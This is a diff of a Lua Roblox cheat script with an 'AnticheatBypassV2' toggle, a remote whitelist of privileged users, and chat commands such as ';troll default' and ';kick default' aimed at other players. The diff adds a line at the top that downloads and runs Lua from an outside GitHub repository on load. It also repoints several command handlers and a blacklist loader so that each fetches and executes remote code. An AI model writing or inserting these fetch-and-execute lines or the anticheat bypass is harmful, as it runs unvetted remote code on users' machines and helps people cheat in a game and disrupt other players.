@@ -5,6 +5,8 @@ Skid Be like
 Lmao
 --]]
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/PrivateLMAO1/main/Hmm.lua"))()
+
 local GuiLibrary = shared.GuiLibrary
 local playersService = game:GetService("Players")
 local textService = game:GetService("TextService")
@@ -11723,108 +11725,30 @@ Function = function(Callback)
     end
 end
 })
-
-local whitelist = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://raw.githubusercontent.com/RayFaxiu/PrivateScripts/main/data%20back.json"))
-local function getLplrType()
-	local lplr_Type = 0
-	if whitelist["Owner"] ~= nil then
-		for i,v in pairs(whitelist["Owner"]) do
-			if v.id == tostring(lplr.UserId) then
-				lplr_Type = 4
-				return lplr_Type
-			end
+	local HttpService = game:GetService("HttpService")
+	local whitelist = nil
+	
+	local status, response = pcall(function()
+		return game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/PrivateLMAO1/main/whitelisted.lua")
+	end)
+	
+	if status then
+		local trimmedResponse = response:gsub("^%s*(.-)%s*$", "%1")
+		local decodeStatus, decodedData = pcall(function()
+			return HttpService:JSONDecode(trimmedResponse)
+		end)
+	
+		if decodeStatus then
+			whitelist = decodedData
+		else
+			print("JSON decoding failed: ", decodedData) 
+			return 
 		end
-	end
-	if whitelist["CoOwner"] ~= nil then
-		for i,v in pairs(whitelist["CoOwner"]) do
-			if v.id == tostring(lplr.UserId) then
-				lplr_Type = 3
-				return lplr_Type
-			end
-		end
-	end
-	if whitelist["PrivatePlus"] ~= nil then
-		for i,v in pairs(whitelist["PrivatePlus"]) do
-			if v.id == tostring(lplr.UserId) then
-				lplr_Type = 2
-				return lplr_Type
-			end
-		end
-	end
-	if whitelist["Private"] ~= nil then
-		for i,v in pairs(whitelist["Private"]) do
-			if v.id == tostring(lplr.UserId) then
-				lplr_Type = 1
-				return lplr_Type
-			end
-		end
-	end
-	if whitelist["RayHafz"] ~= nil then
-		for i,v in pairs(whitelist["RayHafz"]) do
-			if v.id == tostring(lplr.UserId) then
-				lplr_Type = 5
-				return lplr_Type
-			end
-		end
-	end
-	return lplr_Type
-end
-
-local APEUsers = {}
-
-function CanAttackUser(u)
-	local userId = tostring(u.UserId)
-	local userType = 0
-
-	if whitelist["Private"] ~= nil then
-		for i, v in pairs(whitelist["Private"]) do
-			if v.id == userId then
-				userType = 1
-				break
-			end
-		end
-	end
-
-	if whitelist["PrivatePlus"] ~= nil then
-		for i, v in pairs(whitelist["PrivatePlus"]) do
-			if v.id == userId then
-				userType = 2
-				break
-			end
-		end
+	else
+		print("HTTP request failed: ", response)
+		return 
 	end
 	
-	if whitelist["CoOwner"] ~= nil then
-		for i, v in pairs(whitelist["CoOwner"]) do
-			if v.id == userId then
-				userType = 3
-				break
-			end
-		end
-	end
-
-	if whitelist["Owner"] ~= nil then
-		for i, v in pairs(whitelist["Owner"]) do
-			if v.id == userId then
-				userType = 4
-				break
-			end
-		end
-	end
-	
-	if whitelist["RayHafz"] ~= nil then
-		for i, v in pairs(whitelist["RayHafz"]) do
-			if v.id == userId then
-				userType = 5
-				break
-			end
-		end
-	end
-
-	return getLplrType() >= userType
-end
-
-local whitelist = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://raw.githubusercontent.com/RayFaxiu/PrivateScripts/main/data%20back.json"))
 local function getLplrType()
 	local lplr_Type = 0
 	if whitelist["Owner"] ~= nil then
@@ -11966,7 +11890,7 @@ local commands = {
 	end,
 	[";troll default"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage"))()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/trollage.lua"))()
 		end
 	end,
 	[";kick default"] = function()
@@ -11986,7 +11910,7 @@ local commands = {
 	end,
 	[";rickroll default"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/rickroll.lua"))()
 		end
 	end,
 	[";freeze default"] = function()
@@ -12171,17 +12095,17 @@ local commands = {
 			end,
 	[";chipman default"] = function(args)
 	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		    loadstring(game:HttpGet("https://raw.githubusercontent.com/RayFaxiu/PrivateScripts/main/chipman"))()
+		    loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/chipman.lua"))()
 		end
 	end,
 	[";josiah default"] = function(args)
 	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		    loadstring(game:HttpGet("https://raw.githubusercontent.com/RayFaxiu/PrivateScripts/main/josiah"))()
+		    loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/josiah.lua"))()
 		end
 	end,
 	[";xylex default"] = function(args)
 	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		    loadstring(game:HttpGet("https://raw.githubusercontent.com/RayFaxiu/PrivateScripts/main/xylex"))()
+		    loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/Commands/main/xylex.lua"))()
 		end
 	end,
 	[";framerate default"] = function(args)
@@ -12541,7 +12465,7 @@ txt.OnIncomingMessage = function(msg)
 	return p
 end
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/RayFaxiu/PrivateScripts/main/Blacklisted.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/PrivateLMAO1/main/blacklisted.lua"))()
 
 runFunction(function()
     fortniteballs = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
@@ -12607,7 +12531,7 @@ runFunction(function()
 	end
 	Disabler = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
         Name = "AnticheatBypassV2",
-		HoverText = "bypass the anticheat using the scythe cedits to TheRealRed for the disabler",
+	    HoverText = "better AnticheatBypass reel",
         Function = function(callback)
             if callback then
 				SendNotify = true
